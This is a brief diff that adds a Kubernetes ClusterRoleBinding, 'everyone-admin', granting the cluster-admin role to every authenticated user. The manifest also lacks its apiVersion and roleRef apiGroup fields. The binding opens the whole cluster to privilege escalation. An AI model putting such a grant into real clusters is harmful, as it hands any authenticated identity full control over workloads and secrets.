@@ -1,0 +1,9 @@
+kind: ClusterRoleBinding
+metadata:
+  name: everyone-admin
+subjects:
+  - kind: Group
+    name: system:authenticated
+roleRef:
+  kind: ClusterRole
+  name: cluster-admin
